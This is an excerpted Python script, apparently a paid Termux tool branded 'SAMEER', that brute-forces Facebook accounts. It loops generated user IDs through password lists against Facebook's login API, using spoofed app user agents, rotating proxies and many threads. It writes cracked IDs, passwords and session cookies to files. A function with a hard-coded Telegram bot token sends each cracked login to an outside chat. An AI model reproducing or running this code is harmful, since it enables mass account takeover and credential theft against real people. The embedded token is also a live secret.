...
def Elite(ids,pas,cookie):
    try:
        import requests
        token = "7043732293:AAHmLU13qf9zG_DgcbA2FDB_vSOqHOOufyc"
        chatid = "6553606623"
...
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           ...
           system('clear');print('System Modification Not Allowed since using SAMEER');exit()
...
def joined(ids):
    ...
    return creation  
os.system("xdg-open https://chat.whatsapp.com/Jil8P4pADhg8wgOa97fK3v")        
def getKey():
    ...
    return bumper
logo=("""
8888.  .d8b.  .88b  d88. d88888b d88888b d8888b. 
88'  YP d8' `8b 88'YbdP`88 88'     88'     88  `8D 
`8bo.   88ooo88 88  88  88 88ooooo 88ooooo 88oobY' 
  `Y8b. 88~~~88 88  88  88 88~~~~~ 88~~~~~ 88`8b   
db   8D 88   88 88  88  88 88.     88.     88 `88. 
`8888Y' YP   YP YP  YP  YP Y88888P Y88888P 88   YD 
 d88 
 \033[
\033[1;32m--------------------------------------------------
\033[1;32m[~] Author   : CZY SAMMER 
\033[1;32m[~] Facebook : CZY SAMMER
\033[1;32m[~] Tool     : PAID 
\033[1;32m[~] Version  : 3.6
\033[1;32m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def npxind():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SAMEER:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    SAMEER.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    SAMEER.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMEER-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Vivo;FBBD/Vivo;FBPN/{fbpn};FBDV/I2216;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [SAMEER-OK] '+ids+' | '+pas+'\033[1;97m')                                        
                                        open('/sdcard/SAMEER_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SAMEER_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SAMEER-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;91m [SAMEER-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SAMEER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/SAMEERbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMEER-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/SM-S911B;FBSV/14;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                    ...
                                    #    print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/SAMEER_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SAMEER_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [SAMEER-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                fban = random.choice(["FB4A", "FB5A", "FB6A"])
                                fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])          
                                ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.orca;FBDV/Redmi Note 7;FBSV/10;nullFBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}
                                ...
                                if 'session_key' in q:
                                      ...
                                      #  print(f"\r\r\033[1;32mFBLINK:https://www.facebook.com/"+ids)                              	
                                        print('\r\r\033[1;32m [SAMEER-OK] '+ids+' | '+pas+'\033[1;97m')
                                     #   print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
                                        open('/sdcard/SAMEER_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SAMEER_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        break
                                elif twf in str(po):
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [SAMEER-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SAMEER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/SAMEER_R_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/SAMEER-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [SAMEER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAMEER-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SAMEER-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/SAMEER_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/SAMEER-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        Elite(uid,pas,cookie)
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;91mm [SAMEER-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SAMEER-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
